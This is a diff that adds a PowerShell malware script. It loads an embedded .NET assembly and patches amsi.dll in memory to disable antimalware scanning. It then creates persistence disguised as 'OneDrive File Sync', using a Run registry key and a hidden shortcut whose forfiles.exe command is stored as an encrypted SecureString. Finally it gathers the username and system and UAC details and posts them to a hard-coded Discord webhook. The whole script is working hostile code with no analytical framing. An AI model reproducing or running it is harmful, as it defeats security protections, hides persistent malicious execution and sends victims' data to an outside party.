@@ -1,0 +1,160 @@
+$assemblybytes = [byte[]](77,90,144,0,3,0,0,0,4,0,0,0,255,255,0,0,184,0,0,0,0,0,0,0,64,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,128,0,0,0,14,31,186,14,0,180,9,205,33,184,1,76,205,33,84,104,105,115,32,112,114,111,103,114,97,109,32,99,97,110,110,111,116,32,98,101,32,114,117,110,32,105,110,32,68,79,83,32,109,111,100,101,46,13,13,10,36,0,0,0,0,0,0,0,80,69,0,0,76,1,3,0,181,45,7,103,0,0,0,0,0,0,0,0,224,0,2,33,11,1,11,0,0,8,0,0,0,6,0,0,0,0,0,0,126,39,0,0,0,32,0,0,0,64,0,0,0,0,0,16,0,32,0,0,0,2,0,0,4,0,0,0,0,0,0,0,4,0,0,0,0,0,0,0,0,128,0,0,0,2,0,0,0,0,0,0,3,0,64,133,0,0,16,0,0,16,0,0,0,0,16,0,0,16,0,0,0,0,0,0,16,0,0,0,0,0,0,0,0,0,0,0,36,39,0,0,87,0,0,0,0,64,0,0,144,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,96,0,0,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,32,0,0,8,0,0,0,0,0,0,0,0,0,0,0,8,32,0,0,72,0,0,0,0,0,0,0,0,0,0,0,46,116,101,120,116,0,0,0,132,7,0,0,0,32,0,0,0,8,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,32,0,0,96,46,114,115,114,99,0,0,0,144,2,0,0,0,64,0,0,0,4,0,0,0,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,64,0,0,64,46,114,101,108,111,99,0,0,12,0,0,0,0,96,0,0,0,2,0,0,0,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,64,0,0,66,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,96,39,0,0,0,0,0,0,72,0,0,0,2,0,5,0,168,32,0,0,124,6,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,48,5,0,65,0,0,0,1,0,0,17,114,1,0,0,112,40,1,0,0,6,10,6,114,27,0,0,112,40,2,0,0,6,11,7,126,5,0,0,10,40,6,0,0,10,44,11,114,57,0,0,112,115,7,0,0,10,122,7,40,1,0,0,43,12,8,2,3,4,5,111,6,0,0,6,42,30,2,40,9,0,0,10,42,0,0,0,66,83,74,66,1,0,1,0,0,0,0,0,12,0,0,0,118,52,46,48,46,51,48,51,49,57,0,0,0,0,5,0,108,0,0,0,88,2,0,0,35,126,0,0,196,2,0,0,88,2,0,0,35,83,116,114,105,110,103,115,0,0,0,0,28,5,0,0,172,0,0,0,35,85,83,0,200,5,0,0,16,0,0,0,35,71,85,73,68,0,0,0,216,5,0,0,164,0,0,0,35,66,108,111,98,0,0,0,0,0,0,0,2,0,0,1,71,21,2,20,9,10,0,0,0,250,37,51,0,22,0,0,1,0,0,0,13,0,0,0,3,0,0,0,8,0,0,0,21,0,0,0,10,0,0,0,3,0,0,0,1,0,0,0,1,0,0,0,2,0,0,0,1,0,0,0,1,0,0,0,1,0,0,0,1,0,0,0,0,0,10,0,1,0,0,0,0,0,6,0,68,0,61,0,6,0,75,0,61,0,6,0,147,0,61,0,6,0,160,0,61,0,6,0,49,1,18,1,6,0,124,1,92,1,6,0,156,1,92,1,6,0,190,1,18,1,6,0,218,1,61,0,6,0,242,1,61,0,6,0,252,1,18,1,6,0,34,2,18,1,6,0,68,2,18,1,0,0,0,0,1,0,0,0,0,0,1,0,1,0,1,0,16,0,18,0,0,0,5,0,1,0,1,0,2,1,0,0,29,0,0,0,9,0,1,0,5,0,0,0,0,0,128,0,150,32,93,0,10,0,1,0,0,0,0,0,128,0,150,32,105,0,15,0,2,0,80,32,0,0,0,0,150,0,120,0,21,0,4,0,157,32,0,0,0,0,134,24,134,0,30,0,8,0,0,0,0,0,3,0,134,24,134,0,34,0,8,0,0,0,0,0,3,0,198,1,140,0,40,0,10,0,0,0,0,0,3,0,198,1,174,0,49,0,14,0,0,0,0,0,3,0,198,1,186,0,62,0,20,0,0,0,1,0,196,0,0,0,1,0,210,0,0,0,2,0,218,0,0,0,1,0,229,0,0,0,2,0,239,0,0,0,3,0,246,0,2,0,4,0,3,1,0,0,1,0,62,1,0,0,2,0,69,1,0,0,1,0,229,0,0,0,2,0,239,0,0,0,3,0,246,0,2,0,4,0,3,1,0,0,1,0,229,0,0,0,2,0,239,0,0,0,3,0,246,0,2,0,4,0,3,1,0,0,5,0,76,1,0,0,6,0,62,1,2,0,1,0,3,1,0,0,2,0,85,1,41,0,134,0,30,0,49,0,134,0,70,0,57,0,134,0,30,0,65,0,134,0,75,0,73,0,225,1,80,0,73,0,230,1,83,0,81,0,134,0,75,0,89,0,4,2,89,0,9,0,134,0,30,0,97,0,134,0,108,0,46,0,19,0,123,0,46,0,27,0,132,0,99,0,83,0,114,0,101,0,209,1,0,1,3,0,93,0,1,0,0,1,5,0,105,0,1,0,4,128,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,186,1,0,0,4,0,0,0,0,0,0,0,0,0,0,0,1,0,52,0,0,0,0,0,3,0,2,0,17,0,96,0,0,0,0,0,0,60,77,111,100,117,108,101,62,0,107,51,50,46,100,108,108,0,67,108,111,119,110,87,111,114,108,100,0,86,105,114,116,117,97,108,80,114,111,116,101,99,116,68,101,108,101,103,97,116,101,0,109,115,99,111,114,108,105,98,0,83,121,115,116,101,109,0,79,98,106,101,99,116,0,77,117,108,116,105,99,97,115,116,68,101,108,101,103,97,116,101,0,76,111,97,100,76,105,98,114,97,114,121,0,71,101,116,80,114,111,99,65,100,100,114,101,115,115,0,67,117,115,116,111,109,67,104,105,99,107,101,110,0,46,99,116,111,114,0,73,110,118,111,107,101,0,73,65,115,121,110,99,82,101,115,117,108,116,0,65,115,121,110,99,67,97,108,108,98,97,99,107,0,66,101,103,105,110,73,110,118,111,107,101,0,69,110,100,73,110,118,111,107,101,0,108,112,76,105,98,70,105,108,101,78,97,109,101,0,104,77,111,100,117,108,101,0,108,112,80,114,111,99,78,97,109,101,0,108,112,65,100,100,114,101,115,115,0,100,119,83,105,122,101,0,102,108,78,101,119,80,114,111,116,101,99,116,0,108,112,102,108,79,108,100,80,114,111,116,101,99,116,0,83,121,115,116,101,109,46,82,117,110,116,105,109,101,46,73,110,116,101,114,111,112,83,101,114,118,105,99,101,115,0,79,117,116,65,116,116,114,105,98,117,116,101,0,111,98,106,101,99,116,0,109,101,116,104,111,100,0,99,97,108,108,98,97,99,107,0,114,101,115,117,108,116,0,83,121,115,116,101,109,46,82,117,110,116,105,109,101,46,67,111,109,112,105,108,101,114,83,101,114,118,105,99,101,115,0,67,111,109,112,105,108,97,116,105,111,110,82,101,108,97,120,97,116,105,111,110,115,65,116,116,114,105,98,117,116,101,0,82,117,110,116,105,109,101,67,111,109,112,97,116,105,98,105,108,105,116,121,65,116,116,114,105,98,117,116,101,0,107,51,50,0,68,108,108,73,109,112,111,114,116,65,116,116,114,105,98,117,116,101,0,107,101,114,110,101,108,51,50,0,73,110,116,80,116,114,0,90,101,114,111,0,111,112,95,69,113,117,97,108,105,116,121,0,69,120,99,101,112,116,105,111,110,0,77,97,114,115,104,97,108,0,71,101,116,68,101,108,101,103,97,116,101,70,111,114,70,117,110,99,116,105,111,110,80,111,105,110,116,101,114,0,85,110,109,97,110,97,103,101,100,70,117,110,99,116,105,111,110,80,111,105,110,116,101,114,65,116,116,114,105,98,117,116,101,0,67,97,108,108,105,110,103,67,111,110,118,101,110,116,105,111,110,0,0,0,0,25,107,0,101,0,114,0,110,0,101,0,108,0,51,0,50,0,46,0,100,0,108,0,108,0,0,29,86,0,105,0,114,0,116,0,117,0,97,0,108,0,80,0,114,0,111,0,116,0,101,0,99,0,116,0,0,113,70,0,97,0,105,0,108,0,101,0,100,0,32,0,116,0,111,0,32,0,108,0,111,0,99,0,97,0,116,0,101,0,32,0,86,0,105,0,114,0,116,0,117,0,97,0,108,0,80,0,114,0,111,0,116,0,101,0,99,0,116,0,32,0,102,0,117,0,110,0,99,0,116,0,105,0,111,0,110,0,32,0,105,0,110,0,32,0,107,0,101,0,114,0,110,0,101,0,108,0,51,0,50,0,46,0,100,0,108,0,108,0,0,0,64,87,71,35,139,70,254,79,137,61,165,155,6,87,75,162,0,8,183,122,92,86,25,52,224,137,4,0,1,24,14,5,0,2,24,24,14,8,0,4,2,24,25,9,16,9,3,32,0,1,5,32,2,1,28,24,8,32,4,2,24,25,9,16,9,12,32,6,18,13,24,25,9,16,9,18,17,28,7,32,2,2,16,9,18,13,4,32,1,1,8,4,32,1,1,14,2,6,24,5,0,2,2,24,24,6,16,1,1,30,0,24,4,10,1,18,12,6,7,3,24,24,18,12,5,32,1,1,17,53,8,1,0,3,0,0,0,0,0,8,1,0,8,0,0,0,0,0,30,1,0,1,0,84,2,22,87,114,97,112,78,111,110,69,120,99,101,112,116,105,111,110,84,104,114,111,119,115,1,0,76,39,0,0,0,0,0,0,0,0,0,0,110,39,0,0,0,32,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,96,39,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,95,67,111,114,68,108,108,77,97,105,110,0,109,115,99,111,114,101,101,46,100,108,108,0,0,0,0,0,255,37,0,32,0,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,16,0,0,0,24,0,0,128,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,0,0,48,0,0,128,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,72,0,0,0,88,64,0,0,52,2,0,0,0,0,0,0,0,0,0,0,52,2,52,0,0,0,86,0,83,0,95,0,86,0,69,0,82,0,83,0,73,0,79,0,78,0,95,0,73,0,78,0,70,0,79,0,0,0,0,0,189,4,239,254,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,63,0,0,0,0,0,0,0,4,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,68,0,0,0,1,0,86,0,97,0,114,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,0,0,36,0,4,0,0,0,84,0,114,0,97,0,110,0,115,0,108,0,97,0,116,0,105,0,111,0,110,0,0,0,0,0,0,0,176,4,148,1,0,0,1,0,83,0,116,0,114,0,105,0,110,0,103,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,112,1,0,0,1,0,48,0,48,0,48,0,48,0,48,0,52,0,98,0,48,0,0,0,44,0,2,0,1,0,70,0,105,0,108,0,101,0,68,0,101,0,115,0,99,0,114,0,105,0,112,0,116,0,105,0,111,0,110,0,0,0,0,0,32,0,0,0,48,0,8,0,1,0,70,0,105,0,108,0,101,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,48,0,8,0,1,0,73,0,110,0,116,0,101,0,114,0,110,0,97,0,108,0,78,0,97,0,109,0,101,0,0,0,107,0,51,0,50,0,46,0,100,0,108,0,108,0,0,0,40,0,2,0,1,0,76,0,101,0,103,0,97,0,108,0,67,0,111,0,112,0,121,0,114,0,105,0,103,0,104,0,116,0,0,0,32,0,0,0,56,0,8,0,1,0,79,0,114,0,105,0,103,0,105,0,110,0,97,0,108,0,70,0,105,0,108,0,101,0,110,0,97,0,109,0,101,0,0,0,107,0,51,0,50,0,46,0,100,0,108,0,108,0,0,0,52,0,8,0,1,0,80,0,114,0,111,0,100,0,117,0,99,0,116,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,8,0,1,0,65,0,115,0,115,0,101,0,109,0,98,0,108,0,121,0,32,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,32,0,0,12,0,0,0,128,55,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0)
+$assembly = [System.Reflection.Assembly]::Load($assemblybytes)
+Class Hunter {
+    static [IntPtr] FindAddress([IntPtr]$address, [byte[]]$egg) {
+        while ($true) {
+            [int]$count = 0
+
+            while ($true) {
+                [IntPtr]$address = [IntPtr]::Add($address, 1)
+                If ([System.Runtime.InteropServices.Marshal]::ReadByte($address) -eq $egg.Get($count)) {
+                    $count++
+                    If ($count -eq $egg.Length) {
+                        return [IntPtr]::Subtract($address, $egg.Length - 1)
+                    }
+                } Else { break }
+            }
+        }
+
+        return $address
+    }
+}
+
+[IntPtr]$hModule = [ClownWorld]::LoadLibrary("amsi.dll")
+Write-Host "[+] AMSI DLL Handle: $hModule"
+
+[IntPtr]$dllCanUnloadNowAddress = [ClownWorld]::GetProcAddress($hModule, "DllCanUnloadNow")
+Write-Host "[+] DllCanUnloadNow address: $dllCanUnloadNowAddress"
+
+If ([IntPtr]::Size -eq 8) {
+	Write-Host "[+] x64 Detected"
+    [byte[]]$egg = [byte[]] (
+        0x4C, 0x8B, 0xDC,
+        0x49, 0x89, 0x5B, 0x08,
+        0x49, 0x89, 0x6B, 0x10,
+        0x49, 0x89, 0x73, 0x18,
+        0x57,
+        0x41, 0x56,
+        0x41, 0x57,
+        0x48, 0x83, 0xEC, 0x70
+    )
+} Else {
+	Write-Host "[+] x86 Detected"
+    [byte[]]$egg = [byte[]] (
+        0x8B, 0xFF,
+        0x55,
+        0x8B, 0xEC,
+        0x83, 0xEC, 0x18,
+        0x53,
+        0x56
+    )
+}
+[IntPtr]$targetedAddress = [Hunter]::FindAddress($dllCanUnloadNowAddress, $egg)
+Write-Host "[+] Targeted address: $targetedAddress"
+
+$yoyo = 0
+[ClownWorld]::CustomChicken($targetedAddress, [uint32]2, 4, [ref]$yoyo) | Out-Null
+
+$patch = [byte[]] (
+    0x31, 0xC0,    # xor rax, rax
+    0xC3           # ret  
+)
+[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $targetedAddress, 3)
+sleep 10
+$ten = 0
+[ClownWorld]::CustomChicken($targetedAddress, [uint32]2, $yoyo, [ref]$ten) | Out-Null
+
+#sleep 5
+rm "C:\ProgramData\Microsoft OneDrive\FileSync\BeginSync.lnk" -Force
+sleep 5
+
+
+$googoogaagaa = "C:\ProgramData\Microsoft OneDrive\FileSync\BeginSync.lnk"
+if (-Not (Test-Path $googoogaagaa)) {
+rm $env:tmp\onedrivefilesync.dll -force
+New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "OneDrive File Sync" -Value '"C:\ProgramData\Microsoft OneDrive\FileSync\BeginSync.lnk"' -PropertyType String -Force
+mkdir "C:\ProgramData\Microsoft OneDrive\FileSync";
+$shortcutpath = "C:\ProgramData\Microsoft OneDrive\FileSync\BeginSync.lnk"
+
+# Create a new COM object for WScript.Shell
+$wshShell = New-Object -ComObject WScript.Shell
+
+# Create the shortcut
+$shortcut = $wshShell.CreateShortcut($shortcutPath)
+
+# Set the target to PowerShell and the arguments to run 'calc'
+$shortcut.TargetPath = "$env:SystemRoot\System32\forfiles.exe"
+
+
+$data = "76492d1116743f0423413b16050a5345MgB8AFAAdgA3ADQAcwB6AHMAbgBYAEIAbQBaAFkAMQB0AHQAcAB1ADcAUABwAHcAPQA9AHwAYQBiAGUANgA2ADIAYwA0AGMANQA0ADQAZgA5AGIANgA3AGQAMAA4AGIAMABiADUAMgA4ADYANABiADgAZQBmADkAMgBkAGEAOAAxADQAYwA2AGYANAA2AGQAYgBjADkAMwA4ADIAMABkADUAMgA2AGEAMgBmAGMAMAA5ADUAOQAzAGQAMgA3AGIAMwA3AGUAYgAwADgAOAA1ADMAMgBmAGMAYwBhAGUANAAzADgAYwAwAGQAMwBmAGMAYgBmAGMANQAxADcANwAyAGEAOAA3ADIAYwBiADAANgA3ADIANQA2ADYANQAwADUAYQBiADQANwBkAGEANwAxADYAZgA0ADgAMwA3ADMANQA1ADgANwA5ADUAMAA2ADAAZgA2AGQAOABjADgAYwAzADEAZgBkAGMAMwAyADEAZgBiAGIAYwBmAGYAOABmADYAYQA1ADQAYwA3ADUAZgAxADIAMQAwADIAMgA0AGUAMAAzAGEAMgA1AGEAOAAyAGQAMABkADcAOAAxAGUAMABhADQAZQAyAGIAYQA2ADcAMABjADEAMABkADIAMAA4AGUAMgA5AGIAYwBkADgAMQA3ADgAMwA4AGIAZAAzADYAZQAwADAANAA2ADUAOQA0AGMAOABkAGIAOQAyAGMAZAAyADcAOAA2ADUANQBhAGQAZQAwAGUAMABkADAANQBlAGQAMgA4ADgAZQBjAGQAOQAyADUANQBlADEAMwA3ADIANAA5ADAAMQBjADgAZQAwADEANgA1ADUANAA2ADUAYQBkAGQAYgBmADEAZABmADEANwBmADMAYwA0ADgAYwBmAGQAYgAwAGQAOQBiADkAMgBkADAAZgBhADYAOQBmAGEAMwA4ADEANgA5AGUAMQAyADEAYQBkAGMANwA3ADEAOAAxAGYAYgBjAGQAMgBkADAAOQAzADQAMgBjADgANABhADYAOAAxAGMAOQBkAGQAYgBjAGIANQAyAGUAYwBhADEANQBhADYAOQAxAGQAOAAxADAAZAAyADMAMAAwADkAMQAzADQAZgA5AGEAZAAyADIAMAAyAGEAZgA5ADUANAAzADAAMAA3ADUAMwBkADUAMQA3ADgANQBiAGMAMgBmADMAZAAwADUAZQBhADkAZgBlAGUAYgA4ADcANAA1AGYAOQAxADEAOABlADQAOQBjADAAMABjAGUAYgAwADEANwBlAGMAZQA4ADkANAAxADMAYwBjAGYAMABlADkANgBhADAANgAxADgAZQAyADUANQAzADUAZQAxAGQANABiAGYANgA3AGEAMABlAGEAZgA5AGYAZgBkADkAZAA3ADYANwAyAGYAMwAxAGMANwAwAGYAZQBhADAAZgAwADQANgAwADEANwBiADYAYQAyADIANgA1ADgAZQAwADQAMwBjADIAYgA5AGMAYQA0ADYAMAA0ADIAMQA5ADYANQA4AGYANwAyADkAOQA2AGMAZgBhADEAZgA0ADAANABmADcANAA4ADQAZABhADUANgBiADEAMwBiADQAZABjAGEAYQAzADkANABjAGMAMgAxAGEANgBiAGUANgAzADMAMQAxAGUANgA0ADQANgAwAGIAMQA0ADcAZQBiAGEANwAwADUAZAA5AGUANAA1AGYAMQA1ADIANwBhAGYAYgA2ADEAMQA0AGMAYQBhADIAMQBjAGMAZQBiADYAMABhAGYAYwA5AGMAMwBkADMANgA3ADYAZgBmAGEAMgA1ADEAZAAyAGEAMgBjADMAMgA0ADEAOQA0ADUAOQAwADcAYQBjADEAYgAyADEANgBhADUANwAzADQAZABiADMAMQA5AGUAZgA4ADgANgAzADEAMgBhADIANAA1ADEAYwA5AGEAZABhAGQANAA5ADgANwA5ADQAOQBjADkAMQA1ADMAMwA5ADYAOQBlADAAMgAzAGQAMwAwAGQANgBiADIAZQA5ADYAZABhADQAYgBjAGIAMAA3ADEAMgBhAGIAZABmAGEANABhADQANABkADIAMwBjAGQAYwAzADAAZQBhADQANwA5ADAAMgBjADQAZgBhAGQAMAA3AGUAMABjAGQAMgBiADIAOAAxADAAMQBmAGMAMQAxADYAYQBjADEAMwBlAGIAMABjAA=="
+$bytes = [System.Text.Encoding]::UTF8.GetBytes("KaPdSgVkYp3s5v8y/B?E(H+MbQeThWmZ")
+$key = $bytes
+$sas = (New-Object System.Net.NetworkCredential("", (ConvertTo-SecureString -key $key $data))).Password
+$shortcut.Arguments = "$sas"
+
+# Set the shortcut to start minimized
+$shortcut.WindowStyle = 7  # 7 means minimized
+
+# Save the shortcut
+$shortcut.Save()
+$ieoaj = $shortcutpath
+sleep 10
+attrib +s +h $ieoaj
+}
+
+
+
+# Retrieve CPU information
+$cpu = Get-WmiObject -Class Win32_Processor | Select-Object -Property Name, Manufacturer, NumberOfCores, NumberOfLogicalProcessors
+
+# Retrieve GPU information
+$gpu = Get-WmiObject -Class Win32_VideoController | Select-Object -Property Name, AdapterRAM, DriverVersion
+
+$osVersion = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").ProductName
+
+sleep 2
+
+
+# Path to the registry key containing the UAC settings
+$registryPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
+
+# Retrieve both EnableLUA and ConsentPromptBehaviorAdmin values
+try {
+    $uacSettings = Get-ItemProperty -Path $registryPath -Name "EnableLUA", "ConsentPromptBehaviorAdmin" -ErrorAction Stop
+
+    if ($uacSettings.EnableLUA -eq 1 -and $uacSettings.ConsentPromptBehaviorAdmin -eq 2) {
+        $rslt = "Maximum UAC enabled"
+    } else {
+        $rslt = "Maximum UAC - FALSE"
+    }
+} catch {
+    $rslt = "Could not read UAC settings."
+}
+
+
+# Define the Discord webhook URL
+$webhookUrl = "https://discord.com/api/webhooks/1296464833646170193/LY8Iw5O_xIID4RXd1LL841kRqzbRT96LwXOx5ir52hAdQJcz6Yu3fVy0uqU-A0qXxlQb"
+
+# Define the message payload
+$payload = @{
+    content = @"
+================================
+**$env:USERNAME** system online
+
+**GPU:** $($gpu.Name)
+**CPU:** $($cpu.Name)
+**CPU Cores:** $($cpu.NumberOfCores)
+**OS:** $osVersion
+**UAC:** $rslt
+================================
+"@
+} | ConvertTo-Json
+
+# Send the POST request to the webhook URL
+try {
+    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"
+    Write-Output "Message sent successfully."
+} catch {
+    Write-Output "Failed to send message. Error: $_"
+}
+sleep 5
